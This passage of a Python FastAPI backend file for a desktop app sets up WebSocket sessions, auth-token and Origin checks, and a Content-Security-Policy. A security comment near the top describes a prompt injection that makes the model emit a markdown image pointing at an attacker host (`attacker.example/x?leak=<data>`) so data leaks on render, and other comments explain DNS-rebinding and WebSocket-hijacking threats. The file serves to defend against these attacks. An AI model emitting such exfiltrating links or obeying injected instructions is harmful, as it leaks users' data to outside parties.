"""FastAPI application: HTTP surface + the /ws WebSocket endpoint
(Qt-removal plan R0).

Serves three things:
- /api/health - liveness + version (the desktop shell polls this at startup)
- /ws?session=<id> - the event-bus WebSocket (state snapshots out, intents in)
- / - the built SPA (static files), when a build directory exists

Client -> server message kinds over /ws:
  {"kind": "subscribe", "topics": ["system", ...],
   "id": optional}                                        -> current snapshots
  {"kind": "intent", "topic": t, "intent": name,
   "args": [...], "id": optional}                        -> optional result
Server -> client:
  {"kind": "state", "topic": t, "payload": {...envelope...},
   "id": echoed when subscribe supplied one}
  {"kind": "result", "id": ..., "value": ...}            (only when id sent)
  {"kind": "error", "id": ..., "error": "..."}           (bad topic/intent)

R0 registers only the `system` topic (backend identity) and its `ping`
intent - the acceptance round-trip. Real domain topics arrive per-phase
(R1 canvas, R2 chrome, ...), each registering here exactly like system does.
"""

from __future__ import annotations

import json
import logging
import os
import time
from pathlib import Path

from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from starlette.middleware.trustedhost import TrustedHostMiddleware

import api_provider
from graphlink_settings_store import SettingsManager

from backend import BACKEND_VERSION
from backend.about import register_about
from backend.agents import bootstrap_provider_state, register_agents
from backend.assets import register_assets
from backend.auth import (
    AUTH_HEADER,
    AUTH_QUERY_PARAM,
    extract_presented_token,
    is_guarded_path,
    resolve_configured_token,
    token_matches,
)
from backend.canvas import register_canvas
from backend.chat_library import flush_dirty_session_before_teardown, register_chat_library
from backend.composer import register_composer
from backend.api.intents_diagnostics import register_diagnostics_intents
from backend.crash_recovery import maybe_show_crash_notice
from backend.diagnostics import DiagnosticsState
from backend.events import (
    DEFAULT_COALESCE_WINDOW_SECONDS,
    DEFAULT_SESSION_ID,
    EventBus,
    IntentValidationError,
    SessionBus,
    UnknownIntentError,
    UnknownSessionError,
    UnknownTopicError,
)
from backend.execution_limits import register_execution_limits
from backend.notifications import register_notifications
from backend.plugins import register_plugins
from backend.session_context import (
    SessionContext,
    SessionNotConfiguredError,
    attach_session_context,
    get_session_context,
)
from backend.settings import register_settings
from backend.token_counter import register_token_counter

logger = logging.getLogger(__name__)

REPO_ROOT = Path(__file__).resolve().parents[1]
SPA_DIST_DIR = REPO_ROOT / "web_ui" / "dist" / "app"

# Loopback host Graphlink always binds to (graphlink_desktop.py hardcodes
# host="127.0.0.1"). Required, not just preferred, for the same-origin check
# below: comparing Origin's host against the request's own Host header alone
# is a self-consistency check on two client-supplied values, not a check
# against anything the server independently knows to be correct - a DNS-
# rebinding attacker's page has both its Origin AND the Host header it sends
# echo the SAME attacker-controlled hostname, so an Origin==Host comparison
# alone would accept it. Requiring the host part to literally be 127.0.0.1
# closes that: no attacker-controlled hostname is ever literally this string.
_LOOPBACK_HOST = "127.0.0.1"

# The dev-workflow opt-in (CONTRIBUTING.md documents it): unset in every
# real launch (graphlink_desktop.py never sets it). Originally WS-only
# (its name predates ADR-004 stage 4.2) - now also read by
# require_loopback_origin below, since web_ui/vite.config.ts's dev proxy
# forwards BOTH /api and /ws to this backend with the SAME real page
# Origin (Vite's proxy rewrites the Host header it sends to match this
# backend's own address, via changeOrigin, but does not touch Origin) - so
# a developer's fetch() calls need the identical opt-in the WS handshake
# already required, not a second env var for the same real workflow.
DEV_WS_ORIGIN_ENV = "GRAPHLINK_DEV_WS_ORIGIN"

# SECURITY-FIX (finding markdown-image-exfil): every text-bearing node
# (Chat/Conversation/WebResearch/Artifact/...) renders LLM/web-authored
# markdown through NodeMarkdown.tsx/DocumentViewMarkdown.tsx, whose `img`
# override spreads a markdown-supplied `src` straight onto a real `<img>`.
# react-markdown's own default urlTransform permits any http(s) URL by
# design, and the browser fetches an `<img src>` automatically at RENDER
# TIME - no click required, unlike the sibling `<a>` link path. A prompt
# injection that steers the model into emitting
# `![](https://attacker.example/x?leak=<data>)` therefore gets a silent,
# automatic GET to an arbitrary attacker-chosen host the instant the node
# renders. NodeMarkdown/DocumentViewMarkdown now also reject non-http(s)
# `src` schemes the same way the existing SafeAnchor link guard does (see
# those files), but neither can restrict WHICH http(s) host an image may
# be fetched from - that is a network-layer decision, not a component-
# level one. This CSP is that network-layer close: img-src 'self'
# restricts image fetches to this app's own origin (covers the legitimate
# /api/assets/{id} route), and 'data:' additionally covers html-to-image's
# own internal `new Image()` load of a `data:image/svg+xml` document
# during canvas PNG export (exportCanvasPng.ts) - confirmed as the only
# `data:image` use anywhere in web_ui/src before adding it here. No other
# directive is set: this app has shipped with NO Content-Security-Policy
# at all until now, so a broader lockdown (default-src/script-src/etc.)
# risks breaking the SPA's own legitimate script/style loading in ways
# that cannot be verified without a real browser - deliberately scoped to
# just the directive this finding is actually about.
CONTENT_SECURITY_POLICY = "img-src 'self' data:"


def _is_allowed_ws_origin(origin: str | None, host_header: str | None, dev_proxy_origin: str | None = None) -> bool:
    """Handshake-time allowlist for the /ws WebSocket Origin header.

    Defends against cross-site WebSocket hijacking ("localhost service
    takeover"): browsers do not enforce same-origin policy on WebSocket
    connects the way they do fetch/XHR, so any page open in the user's
    regular browser - malicious or compromised, or a bad ad iframe - can
    already open a socket to ws://127.0.0.1:<port>/ws. The Origin header is
    the standard mitigation because page JS cannot set or suppress it (it is
    a forbidden header name); this function is the exact accept/reject
    decision made from it, once, at handshake time.

    Policy (exact string equality only - never substring/startswith, which
    would reopen bypasses like "http://127.0.0.1:5173.evil.com"):

    - origin is None or "" -> True. A real browser always sends Origin for a
      page-script-initiated connect, so an absent Origin cannot be that
      attack; it can only be a non-browser caller (tests, curl, local
      tooling) - a different threat model, since anything already able to
      speak raw WebSocket to this loopback-only port could set Origin to
      any string it likes anyway (only browsers are forbidden from spoofing
      it). Rejecting "absent" would stop zero real attacks.
    - origin == "null" -> False. Only produced by opaque-origin contexts
      (sandboxed iframe without allow-same-origin, data:/file: pages) - all
      attacker-constructed, never a legitimate caller of this app.
    - origin == f"http://{host_header}" AND host_header's host part is
      literally "127.0.0.1" -> True. The normal packaged-app case (pywebview
      window and its backend are same-origin), computed per-request (never
      hardcoded - the port is a dynamically OS-assigned free port; see
      graphlink_desktop.py's _free_port()) - the added 127.0.0.1 requirement
      is what actually defeats DNS rebinding, see _LOOPBACK_HOST's comment.
    - dev_proxy_origin is not None AND origin == dev_proxy_origin -> True.
      Deliberately NOT a hardcoded constant this function trusts on its own:
      the real desktop app (graphlink_desktop.py) never passes one, so this
      branch is dead in the shipped product by construction, not just by
      convention - only ws_endpoint's own caller, reading an opt-in env var
      that is unset in normal operation, can ever supply a non-None value
      here (see GRAPHLINK_DEV_WS_ORIGIN at the call site). Without this, the
      previous version of this function hardcoded Vite's default dev port
      (5173) as an always-trusted origin - correct for the real vite-proxy
      dev workflow, but wrong to trust unconditionally in the shipped app,
      since 5173 is an extremely common default port for unrelated Vite
      projects a user could have running in the same browser.
    - anything else present -> False.
    """
    if origin is None or origin == "":
        return True
    if origin == "null":
        return False
    if host_header:
        host_only = host_header.rsplit(":", 1)[0]
        if host_only == _LOOPBACK_HOST and origin == f"http://{host_header}":
            return True
    if dev_proxy_origin and origin == dev_proxy_origin:
        return True
    return False


def _configure_session(
    bus: SessionBus,
    settings_manager: SettingsManager,
    chat_db_path: Path | None,
    previous_run_crashed: bool = False,
    session_count_fn=None,
) -> None:
    """Give every session the R0 topic surface. Later phases extend this
    with canvas/chrome/node topics - one registrar, one place to read the
    whole API surface."""

    bus.register_topic(
        "system",
        lambda: {"app": "graphlink", "backendVersion": BACKEND_VERSION, "sessionId": bus.session_id},
    )

    def ping(*args):
        # The R0 acceptance round-trip: echo + a server-side timestamp so the
        # UI can prove the reply crossed the process boundary.
        return {"echo": list(args), "serverTime": time.time()}

    bus.register_intent("system", "ping", ping)

    # R2: notifications, moved ahead of canvas - R3.3's sendMessage intent
    # needs a real NotificationState to give an honest agent-dispatch notice.
    notifications_state = register_notifications(bus, settings_manager)
    # R6.7: a no-op unless graphlink_desktop.py's own running.lock sentinel
    # found the prior run didn't reach a clean shutdown - see
    # backend/crash_recovery.py's module docstring for the full mechanism.
    maybe_show_crash_notice(notifications_state, previous_run_crashed)

    # R2: composer draft/reasoning, token counter. Moved ahead of canvas (R4):
    # sendMessage's real agent dispatch needs a real ComposerDocument to flip
    # into/out of "generating" state, and a real AgentDispatcher to hand off
    # to - both must exist before register_canvas builds the sendMessage
    # intent that calls them.
    token_counter = register_token_counter(bus, settings_manager)
    composer_document = register_composer(bus, token_counter, settings_manager, notifications_state)

    # ADR-016 stage 16.3: in-app diagnostics - fresh per session, same
    # posture as token_counter/composer_document above (see backend/
    # diagnostics.py's own module docstring for why this is safe despite
    # RunRegistry's own logging already existing - explicit callbacks, not
    # a shared logging.Handler). set_publish_recorder is a post-construction
    # hook because bus (SessionBus) is already built by the time
    # _configure_session runs (EventBus.session() constructs it).
    diagnostics = DiagnosticsState(session_count_fn=session_count_fn)
    bus.set_publish_recorder(diagnostics.record_publish)
    bus.register_topic("diagnostics", diagnostics.payload)

    # R4 (doc/QT_REMOVAL_PLAN.md): the agent-dispatch service - one
    # AgentDispatcher per session (never a module-level singleton). Reachable
    # via SessionContext (backend/session_context.py) so ws_endpoint's
    # disconnect handler can reach it and cancel any in-flight request when
    # this session's last connection drops - see AgentDispatcher.cancel_all's
    # own docstring for why that matters.
    #
    # ADR-006 stage 6.5: each session gets its own ProviderRuntime. The
    # default session keeps the module-backed DEFAULT_RUNTIME - expressed as
    # None here because that is AgentDispatcher's "default session" contract:
    # None keeps every provider call routing through api_provider's module-
    # level functions (which ARE DEFAULT_RUNTIME's state, and which the
    # existing test suite monkeypatches), byte-identical to pre-6.5. Any
    # other session starts as a snapshot-copy of the default configuration
    # and diverges from there.
    if bus.session_id == DEFAULT_SESSION_ID:
        provider_runtime = None
    else:
        provider_runtime = api_provider.ProviderRuntime.from_snapshot(
            api_provider.DEFAULT_RUNTIME.snapshot()
        )
    agent_dispatcher = register_agents(
        bus, composer_document, notifications_state, settings_manager, provider_runtime, diagnostics
    )

    # R1 (doc/QT_REMOVAL_PLAN.md): scene document + grid topics.
    # R3.21: the document is reachable via SessionContext so backend/assets.py's
    # GET /api/assets/{id} route (registered once, globally, on the app) can
    # reach the SAME per-session SceneDocument register_canvas() builds here -
    # there was previously no way to get from a session id back to its
    # canvas document outside this closure.
    canvas_document = register_canvas(
        bus, notifications_state, agent_dispatcher, composer_document, token_counter
    )

    # ADR-016 stage 16.4: the diagnostics topic's two intents (export bundle,
    # open log folder) - registered here, not immediately next to stage
    # 16.3's `bus.register_topic("diagnostics", diagnostics.payload)` call
    # above, because both need canvas_document (the SceneDocument the bundle
    # tallies node counts from), which does not exist until register_canvas
    # returns it, right above this line.
    register_diagnostics_intents(bus, canvas_document, diagnostics)

    # ADR-002 stage 2.1d: ONE typed reference from here on
    # (backend/session_context.py), replacing what used to be two loose
    # dynamic bus attributes (bus.agent_dispatcher/bus.canvas_document) that
    # any OTHER module reading them had no way to know might not exist on a
    # SessionBus built outside this function.
    attach_session_context(
        bus, SessionContext(agent_dispatcher=agent_dispatcher, canvas_document=canvas_document)
    )

    # R2.5: about, plugins, settings, chat library.
    register_about(bus)
    # ADR-005 stage 5.4: same zero-live-state shape as register_about above -
    # see backend/execution_limits.py's own docstring.
    register_execution_limits(bus)
    # R5.1: register_plugins needs the same session's canvas_document (built
    # just above) so "Web Research" can create a real node - this ordering
    # (canvas_document exists before register_plugins runs) is load-bearing.
    # ADR-014 stage 14.4: settings_manager threaded through too - it's the
    # deny-by-default grant store _execute_discovered_plugin/
    # invokePluginIntent consult before letting a non-built-in plugin act.
    register_plugins(bus, notifications_state, canvas_document, settings_manager)
    # R7.4a: register_settings now takes notifications_state too, so the
    # API-provider page's save-validation/init-failure paths can surface a
    # real banner (same load-bearing ordering precedent as register_plugins/
    # register_chat_library above - notifications_state already exists by
    # this point in every case).
    register_settings(bus, settings_manager, notifications_state, agent_dispatcher)
    # R6.4: register_chat_library needs the same session's canvas_document
    # (built above) so loadChat can actually restore a session into it, and
    # notifications_state so a failed/empty load can surface a real banner -
    # same load-bearing ordering precedent as register_plugins above.
    # ADR-014 review-fix: settings_manager threaded through too, the same
    # reason register_plugins gets it two lines up - a plugin node's own
    # serialize/deserialize hook must respect its Settings > Plugins grant
    # on save/load/autosave, not just live-wire scene publishes.
    register_chat_library(bus, chat_db_path, canvas_document, notifications_state, settings_manager=settings_manager)


def _evict_idle_session(bus: SessionBus) -> bool:
    """ADR-004 stage 4.3: EventBus.sweep_idle_sessions' injected teardown -
    see that method's own docstring for why this lives here rather than in
    backend/events.py (SessionContext/AgentDispatcher knowledge belongs to
    this module, not the domain-agnostic event bus).

    Returns False (veto the eviction, try again next sweep) if a real
    in-flight run or chat mutation is still active - a monotonic-time TTL is
    not a substitute for actually knowing cancellation has finished. A chat
    mutation includes autosave's pre-write read/backup awaits: cancelling its
    task there would prevent the database write from ever starting, while the
    old "guard active, so skip the final flush" branch discarded the only
    remaining copy of the dirty document. Otherwise performs the same
    disconnect-time teardown ws_endpoint's own finally block already does on
    a normal last-connection-drops path (cancel_all +
    cancel_all_pending_approvals), plus the one thing that path never had to
    do because it never applied to an ABANDONED session before this stage:
    cancel the autosave task, so its closure stops holding the whole
    SceneDocument alive via a strong reference nothing can ever reach again
    once this session is gone from EventBus._sessions.
    """
    try:
        context = get_session_context(bus)
    except SessionNotConfiguredError:
        # A bus that never finished _configure_session (a genuine failure
        # during setup) has no dispatcher/document to tear down - safe to
        # evict outright rather than getting stuck vetoing forever.
        return True
    if context.agent_dispatcher.has_in_flight_runs():
        return False
    mutation_guard = getattr(bus, "chat_mutation_guard", None)
    if mutation_guard is not None and mutation_guard.get("active"):
        # Do not cancel an autosave/user save/load/rename halfway through an
        # await. The next sweep retries after the guard's finally block has
        # released, at which point the normal dirty flush + teardown is safe.
        return False
    context.agent_dispatcher.cancel_all()
    context.agent_dispatcher.cancel_all_pending_approvals()
    # PLAN-2026-08-24 §2.3: cancelling RUNS does not stop the harness's
    # long-lived processes - a shell.session dev server and a python.exec
    # interpreter are deliberately decoupled from any single run, so an
    # evicted session would otherwise leave them alive with nothing left
    # holding a reference able to stop them (the dispose_all_pycoder_repls
    # gap this mirrors, for the surfaces that replaced it).
    context.agent_dispatcher.dispose_all_harness_processes()

    # ADR-009 stage 9.2 / ADR-004 stage 4.3 interaction: flush a dirty
    # session's chat BEFORE cancelling its autosave task - see
    # flush_dirty_session_before_teardown's own docstring for the real gap
    # this closes (cancelling the task outright, the pre-9.2 behavior here,
    # could silently lose up to one full autosave interval's worth of
    # edits on every idle eviction) and for why it deliberately does NOT
    # get a notifications reference from this call site (nothing could
    # ever observe it - eviction only ever runs for a session with zero
    # live connections). Only attempted when chat_library.py's own
    # register_chat_library actually ran for this bus (bus.chat_db_path
    # unset - e.g. several tests in this suite build a bare SessionBus/
    # SessionContext directly, without ever registering the chat library -
    # means there is nothing to flush). An active mutation already vetoed
    # eviction above, so reaching this point guarantees this synchronous
    # final flush cannot race an autosave/manual chat operation.
    chat_db_path = getattr(bus, "chat_db_path", None)
    last_saved = getattr(bus, "chat_save_state", None)
    if chat_db_path is not None and last_saved is not None:
        try:
            flush_dirty_session_before_teardown(chat_db_path, context.canvas_document, last_saved)
        except Exception:
            logger.exception("eviction flush crashed - proceeding with eviction anyway")

    autosave_task = getattr(bus, "autosave_task", None)
    if autosave_task is not None and not autosave_task.done():
        autosave_task.cancel()
    return True


def create_app(
    spa_dir: Path | None = None,
    settings_state_file: Path | None = None,
    chat_db_path: Path | None = None,
    previous_run_crashed: bool = False,
    auth_token: str | None = None,
    restrict_sessions: bool = True,
) -> FastAPI:
    app = FastAPI(title="Graphlink backend", version=BACKEND_VERSION)
    # ADR-004 stage 4.1: the per-launch capability token gating /api/* and
    # /ws - see backend/auth.py's own docstring for the threat (audit C5) and
    # why a token rather than accounts. None means "auth disabled", which is
    # what a bare create_app() in a test gets; the real launch path always
    # passes one (asserted by tests/test_graphlink_desktop.py, so shipping
    # with auth off is a test failure rather than a silent regression).
    resolved_auth_token = resolve_configured_token(auth_token)
    app.state.auth_token = resolved_auth_token
    if resolved_auth_token is None:
        logger.warning(
            "no capability token configured - /api and /ws are UNAUTHENTICATED "
            "(expected only in tests; the desktop shell always mints one)"
        )
    # ONE SettingsManager for the whole app (it owns a single shared
    # ~/.graphlink/session.dat file), shared across every session rather
    # than reconstructed per-session - see backend/settings.py's docstring.
    settings_manager = SettingsManager(settings_state_file)
    # R4: bootstrap api_provider's module-level provider state from that same
    # SettingsManager exactly ONCE per process - process-global state, not
    # session state (see backend/agents.py's docstring).
    bootstrap_provider_state(settings_manager)
    # ADR-016 stage 16.1: deliberately NOT calling apply_log_level here -
    # create_app() is constructed dozens of times per pytest run (every test
    # that touches the WS/HTTP surface), and mutating the ROOT logger's level
    # as a side effect of that would silently change what caplog captures for
    # every unrelated test running afterward (root defaults to WARNING;
    # nothing here would ever set it back). The real boot path
    # (graphlink_desktop.py's main(), never invoked by tests) applies the
    # persisted level once; the live intent (setLogLevel, app-settings topic)
    # applies a user-initiated change - both explicit, neither an invisible
    # side effect of building the app.
    bus = EventBus(
        configure_session=lambda session_bus: _configure_session(
            session_bus, settings_manager, chat_db_path, previous_run_crashed,
            # ADR-016 stage 16.3: `bus` here is EventBus.session()'s host
            # instance, resolved by Python's normal closure late-binding -
            # this lambda only ever RUNS after `bus = EventBus(...)` has
            # fully returned and bound the name in the enclosing scope, even
            # though it's syntactically referenced mid-construction here.
            session_count_fn=lambda: len(bus._sessions),
        ),
        # ADR-004 stage 4.3: see _evict_idle_session's own docstring.
        evict_idle_session=_evict_idle_session,
        # restrict_sessions defaults to True (the real, shipped policy);
        # False is a test-only escape hatch for the handful of tests that
        # deliberately exercise EventBus's own generic cross-session
        # isolation THROUGH the real /ws or /api/assets surface, a scenario
        # that is otherwise unreachable in the shipped app once this
        # restriction is on (only DEFAULT_SESSION_ID is ever issuable) -
        # see EventBus's own module docstring for the full ADR-004 stage
        # 4.3 reasoning on why the restriction lives at this layer, not
        # unconditionally inside EventBus itself.
        allowed_session_ids=frozenset({DEFAULT_SESSION_ID}) if restrict_sessions else None,
        # ADR-003 stage 3.4 follow-on: the real, shipped bus coalesces a
        # burst of same-topic publishes into one outbound message. Opted in
        # HERE rather than defaulted on inside SessionBus so unit tests keep
        # publishes synchronously complete on return - see SessionBus's own
        # __init__ docstring.
        coalesce_window_seconds=DEFAULT_COALESCE_WINDOW_SECONDS,
    )
    app.state.bus = bus

    @app.middleware("http")
    async def require_capability_token(request: Request, call_next):
        """ADR-004 stage 4.1: gate every /api/* request on the capability
        token. Registered as middleware rather than a per-route dependency
        so a future route added under /api/ is covered by construction -
        forgetting a decorator is exactly how this kind of guard rots.

        Deliberately does NOT gate the SPA bootstrap (GET /, /assets/*, the
        client-side-route catch-all): the initial page load cannot carry a
        header, and those routes only serve the public build output. See
        backend/auth.py's docstring.

        Note this never sees WebSocket connections - Starlette's HTTP
        middleware stack only runs for scope["type"] == "http", so /ws is
        guarded separately inside ws_endpoint below. That is a real
        constraint of the framework, not a stylistic split, and it is why
        the two checks cannot be collapsed into one place.
        """
        if resolved_auth_token is not None and is_guarded_path(request.url.path):
            presented = extract_presented_token(
                request.headers.get(AUTH_HEADER),
                request.query_params.get(AUTH_QUERY_PARAM),
            )
            if not token_matches(resolved_auth_token, presented):
                # Uniform 401 with no detail: never distinguish "no token"
                # from "wrong token" from "malformed header", so this is not
                # an oracle for probing the token's shape.
                logger.warning("rejected unauthenticated request: %s", request.url.path)
                return JSONResponse({"error": "unauthorized"}, status_code=401)
        return await call_next(request)

    @app.middleware("http")
    async def require_loopback_origin(request: Request, call_next):
        """ADR-004 stage 4.2: gate every /api/* request on the SAME
        Origin-allowlist logic /ws's own handshake already applies -
        `_is_allowed_ws_origin` is called here VERBATIM, not reimplemented,
        so the two surfaces can never drift apart on what counts as a
        trusted origin (see that function's own docstring for the full
        policy: absent Origin allowed, same-origin allowed, the opt-in dev
        proxy origin allowed, everything else rejected).

        This is registered AFTER require_capability_token above, which -
        per FastAPI/Starlette's own middleware stacking (the LAST
        `@app.middleware("http")` registered ends up OUTERMOST, running
        first on the way in) - makes this the outer of the two checks: a
        wrong-origin request never even reaches the token comparison.
        Verified empirically before relying on it; not stated from memory.

        A DIFFERENT defense from TrustedHostMiddleware below, not a
        redundant one. DNS rebinding (an attacker's own domain, briefly
        re-resolved to 127.0.0.1) makes the browser send THAT domain as the
        Host header - but a plain <img>/asset-style GET typically carries
        NO Origin header at all, and this function's own "absent Origin"
        branch deliberately allows that (see _is_allowed_ws_origin's
        docstring for why) - so an Origin check alone would not catch
        rebinding. TrustedHostMiddleware is what catches it, by rejecting
        the attacker's Host outright. This check instead catches the
        complementary case: a page on some OTHER real origin issuing a
        direct cross-origin fetch() straight at 127.0.0.1:<port> (no
        rebinding needed - Host is legitimately 127.0.0.1, since the
        attacker just knows or guesses the loopback port) - Origin would be
        that page's own real origin, not this app's, and TrustedHostMiddleware
        has no opinion on Origin at all. Neither check subsumes the other;
        both are required to close both shapes of the same threat.
        """
        if is_guarded_path(request.url.path):
            dev_proxy_origin = os.environ.get(DEV_WS_ORIGIN_ENV)
            if not _is_allowed_ws_origin(
                request.headers.get("origin"), request.headers.get("host"), dev_proxy_origin
            ):
                logger.warning(
                    "rejected cross-origin request: %s origin=%r",
                    request.url.path, request.headers.get("origin"),
                )
                return JSONResponse({"error": "forbidden"}, status_code=403)
        return await call_next(request)

    # ADR-004 stage 4.2: closes the DNS-rebinding path to /api/assets/* (the
    # concrete case audit finding C6 named) by rejecting any request whose
    # Host header isn't literally 127.0.0.1, regardless of what the TCP
    # connection's own destination IP was - a rebinding attacker's page
    # issues its request against ITS OWN domain (now re-resolved to
    # 127.0.0.1), so the raw socket lands here, but the Host header the
    # browser sends is still the attacker's domain. This is genuinely a
    # DIFFERENT check from require_loopback_origin above - see that
    # function's own docstring for exactly which threat each one closes and
    # why neither is redundant with the other.
    #
    # Registered LAST (after both @app.middleware("http") decorators just
    # above), which - verified empirically, not assumed - makes it the
    # OUTERMOST layer of all three: a bad Host is rejected before either
    # origin or token is ever inspected. Applies globally (Starlette's
    # TrustedHostMiddleware covers both HTTP and WebSocket scopes, confirmed
    # by test), not just to /api - the SPA bootstrap gains this protection
    # too, for free, since (unlike the auth token) the Host header is
    # present on every request including the very first navigation, so
    # there is no chicken-and-egg problem gating it.
    app.add_middleware(TrustedHostMiddleware, allowed_hosts=[_LOOPBACK_HOST])

    @app.get("/api/health")
    async def health() -> JSONResponse:
        # Gated like every other /api route (ADR-004 §1 says "every /api/*
        # request", and this is deliberately not carved out): the only real
        # caller is graphlink_desktop.py's own startup poll, which minted the
        # token and passes it. Leaving it open would hand any local process a
        # free "is Graphlink running, and what version" fingerprinting oracle
        # for no benefit the shell needs.
        return JSONResponse({"status": "ok", "app": "graphlink", "version": BACKEND_VERSION})

    # R3.21: GET /api/assets/{id} - the image-node byte-serving route (see
    # backend/assets.py's docstring for the transport decision behind it).
    register_assets(app, bus)

    @app.websocket("/ws")
    async def ws_endpoint(websocket: WebSocket) -> None:
        origin = websocket.headers.get("origin")
        host_header = websocket.headers.get("host")
        # Unset in every real launch (graphlink_desktop.py never sets this) -
        # a developer running `npm run dev` (web_ui/vite.config.ts's
        # GRAPHLINK_ISLAND=app target) against a separately-run backend must
        # opt in explicitly by setting this to their vite dev server's real
        # origin (e.g. "http://127.0.0.1:5173"), rather than that origin
        # being trusted unconditionally in the shipped app.
        dev_proxy_origin = os.environ.get(DEV_WS_ORIGIN_ENV)
        if not _is_allowed_ws_origin(origin, host_header, dev_proxy_origin):
            logger.warning("rejected WS handshake: origin=%r host=%r", origin, host_header)
            await websocket.close(code=1008)
            return
        # ADR-004 stage 4.1: the capability token, checked IN ADDITION to the
        # origin check above - defense in depth, and the two defend genuinely
        # different threats. The origin check stops a malicious PAGE in the
        # user's browser (which cannot forge Origin); it cannot stop a local
        # PROCESS, which can send any Origin it likes or omit it entirely
        # (the deliberately-allowed "absent Origin" branch in
        # _is_allowed_ws_origin). The token is what closes that second hole -
        # see backend/auth.py's docstring on audit finding C5.
        if resolved_auth_token is not None:
            presented = extract_presented_token(
                websocket.headers.get(AUTH_HEADER),
                websocket.query_params.get(AUTH_QUERY_PARAM),
            )
            if not token_matches(resolved_auth_token, presented):
                logger.warning("rejected unauthenticated WS handshake: origin=%r", origin)
                # 1008 (policy violation), matching the origin rejection just
                # above - closed before accept(), so no session is created and
                # an unauthenticated caller cannot reach the C6 session-growth
                # vector either.
                await websocket.close(code=1008)
                return
        session_id = websocket.query_params.get("session", DEFAULT_SESSION_ID)
        try:
            session = bus.session(session_id)
        except UnknownSessionError:
            # ADR-004 stage 4.3: "unknown ids are rejected, not auto-
            # created" - a distinct branch from the generic except below,
            # since this is a CLIENT policy violation (an id we never
            # issued), not a server-side bug. Matches the origin/token
            # rejection branches above: warning-level log, 1008 (policy
            # violation), closed before accept() so no session is ever
            # created for it and the C6 growth vector this stage closes
            # can never be reached this way either.
            logger.warning("rejected WS handshake: unknown session_id=%r", session_id)
            await websocket.close(code=1008)
            return
        except Exception:
            # R6.7 adversarial-review finding: a bug in one of
            # _configure_session's register_X calls used to be swallowed
            # entirely - it never reaches here as a Python-level unhandled
            # exception (uvicorn's own ASGI machinery catches it first and
            # logs it via "uvicorn.error", a logger that does NOT propagate
            # to the root logger - see backend/crash_recovery.py's own
            # RotatingFileHandler, attached to root), so it landed neither
            # in graphlink.log nor in sys.excepthook, contradicting this
            # increment's own point. Logging it via THIS module's own
            # logger (which does propagate to root, exactly like the
            # existing dispatch_intent failure path just below does) is
            # what actually gets it into the log file; closing with 1011
            # (server error) mirrors the origin-rejection branch above -
            # reject cleanly before accept() rather than leaving the
            # client to uvicorn's own default handling.
            logger.exception("session setup failed for session_id=%r", session_id)
            await websocket.close(code=1011)
            return
        # ADR-004 stage 4.3 adversarial-review finding: pin the session
        # against eviction HERE, in the same synchronous stretch as the
        # bus.session() lookup above (no await between them) - not just at
        # session.attach() below. Between this point and attach(), the only
        # await is websocket.accept(); the free-running eviction sweep runs
        # as an independent asyncio task and can interleave during that
        # gap. A session eligible for eviction (idle >= TTL) is exactly the
        # state a genuine reconnect after a network blip or laptop sleep is
        # already in by design (see backend/events.py's own TTL reasoning),
        # so this is not a rare theoretical case - confirmed empirically:
        # an unforced concurrent-scheduling stress test found the sweep
        # winning this race in 8/500 trials. Without this line, a session
        # evicted in that window is torn down (autosave cancelled, removed
        # from EventBus._sessions) while session.attach() below still
        # succeeds anyway (attach() has no way to know its bus was just
        # orphaned) - the client ends up live-attached to a SessionBus
        # nothing else can ever reach again, split-brained against a fresh
        # empty one any other route (e.g. GET /api/assets/{id}) would get
        # for the same session id.
        #
        # Known, accepted residual: if websocket.accept() itself raises
        # (pathological - every upstream check has already passed by this
        # point), this session's idle_since stays None forever, since
        # nothing calls .detach() on a session that never reached attach().
        # That session simply becomes permanently ineligible for eviction
        # rather than corrupting shared state - a narrow, self-contained
        # downgrade back to pre-stage-4.3 behavior for that one session,
        # not the split-brain this fix closes for the common case.
        session.idle_since = None
        await websocket.accept()
        # ADR-003 stage 3.4 follow-on: buffered, so this socket's own pace
        # can never stall delivery to another window or block whichever
        # coroutine published (an agent run, or this very receive loop).
        # See SessionBus.attach / _BufferedConnection.
        session.attach(websocket, buffered=True)
        try:
            while True:
                # REVIEW-FIX: receive_json() is a bare json.loads() with no
                # try/except of its own (starlette's own implementation) -
                # a text frame that isn't syntactically valid JSON AT ALL
                # (as opposed to valid-JSON-but-wrong-shape, which
                # _handle_message's own guards below already handle
                # gracefully) raised json.JSONDecodeError straight out of
                # this await, past the only except clause here
                # (WebSocketDisconnect only), and killed the connection
                # outright with zero client-facing feedback - the same
                # failure mode the non-dict/non-list REVIEW-FIXes in
                # _handle_message already closed for their own trigger
                # points, just left open at this earlier one. Caught here
                # (inside the loop, not by the WebSocketDisconnect clause
                # below) so a malformed frame gets the same graceful
                # kind:error reply and the loop simply continues instead of
                # tearing down the session.
                try:
                    message = await websocket.receive_json()
                except json.JSONDecodeError:
                    await websocket.send_json(
                        {"kind": "error", "id": None, "error": "malformed message: invalid JSON"}
                    )
                    continue
                await _handle_message(session, websocket, message)
        except WebSocketDisconnect:
            pass
        finally:
            session.detach(websocket)
            # Concurrency/security review finding (R4): a client that sends
            # a message then immediately disconnects would otherwise leave
            # the real outbound LLM call running server-side, untethered,
            # for up to WATCHDOG_TIMEOUT_SECONDS with no way to ever cancel
            # it - cancelChatRequest needs a live socket to arrive over.
            # Only cancel once the LAST connection for this session drops:
            # another tab/window on the same session should not lose its
            # in-flight request just because a different tab closed.
            if session.connection_count == 0:
                # ADR-002 stage 2.1d adversarial review finding: guarded to
                # match the exact R6.7 precedent above (bus.session()'s own
                # try/except) - an uncaught exception inside this finally
                # block would otherwise vanish into uvicorn's own
                # "uvicorn.error" logger, which does not propagate to root
                # and never reaches graphlink.log. get_session_context()
                # cannot actually raise here today (session only ever
                # reaches this point via a successful bus.session() call
                # above, which guarantees a SessionContext is already
                # attached), but the cost of guarding it is one log line
                # against a failure mode that is otherwise silent forever.
                try:
                    agent_dispatcher = get_session_context(session).agent_dispatcher
                except Exception:
                    logger.exception("post-disconnect cleanup failed for session_id=%r", session.session_id)
                else:
                    agent_dispatcher.cancel_all()
                    # R5.4: a DELIBERATE, SCOPED extension of this disconnect
                    # contract, applied ONLY to the Execution Sandbox/Harness
                    # approval-pause slots - not retrofitted onto the
                    # pre-existing web_research/artifact/gitlink slots (a real,
                    # separate, out-of-scope gap: every one of those already
                    # self-terminates via asyncio.wait_for(..., timeout=...), so
                    # cancel_all() alone is enough for them). An approval pause
